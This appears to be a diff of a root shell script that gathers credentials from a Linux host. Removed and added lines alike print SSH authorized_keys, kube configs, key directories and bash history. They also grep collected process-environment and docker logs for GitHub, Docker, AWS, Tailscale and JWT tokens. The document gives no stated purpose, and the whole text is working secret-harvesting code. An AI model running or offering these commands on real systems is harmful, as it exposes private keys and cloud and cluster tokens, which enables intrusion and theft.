@@ -1,14 +1,15 @@
-echo "=== auth-keys ==="
-cat /root/.ssh/authorized_keys /home/ubuntu/.ssh/authorized_keys 2>&1
-echo "=== known_hosts ==="
-cat /root/.ssh/known_hosts 2>&1
-echo "=== token-pattern hits in ps-env.log (dedup) ==="
-grep -aoE "(tskey-[a-z]+-[A-Za-z0-9_-]+|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|dckr_pat_[A-Za-z0-9_-]{27}|AKIA[A-Z0-9]{16}|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})" /root/snoop/ps-env.log 2>/dev/null | sort -u | head -40
-echo "=== token-pattern hits in docker-inspects.jsonl (dedup) ==="
-grep -aoE "(tskey-[a-z]+-[A-Za-z0-9_-]+|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|dckr_pat_[A-Za-z0-9_-]{27}|AKIA[A-Z0-9]{16})" /root/snoop/docker-inspects.jsonl 2>/dev/null | sort -u | head -40
-echo "=== auth-tail interesting ==="
-grep -aE "Accepted|session opened" /root/snoop/auth-tail.log 2>/dev/null | tail -20
-echo "=== caddywatch ==="
-ls -la /root/ 2>/dev/null | head -30; cat /root/caddywatch* 2>/dev/null | tail -20
-echo "=== tailscale ==="
-tailscale status 2>&1 | head -25
+echo "=== .kube ==="
+ls -laR /root/.kube/ 2>&1
+for f in /root/.kube/config /root/.kube/*/*; do [ -f "$f" ] && echo "--- $f ---" && cat "$f"; done 2>&1 | head -120
+echo "=== .rxk ==="
+cat /root/.rxk 2>&1
+echo "=== .config ==="
+ls -laR /root/.config/ 2>&1 | head -30
+echo "=== dxrg ==="
+ls -la /root/dxrg/ 2>&1; cat /root/dxrg/* 2>&1 | head -20
+echo "=== keys dirs ==="
+ls -la /root/keys/ /root/keys62/ 2>&1
+echo "=== bash_history ==="
+tail -60 /root/.bash_history 2>&1
+echo "=== tailscale rx-node IPs ==="
+tailscale status 2>&1 | grep -E "novita|85-234" | head -20
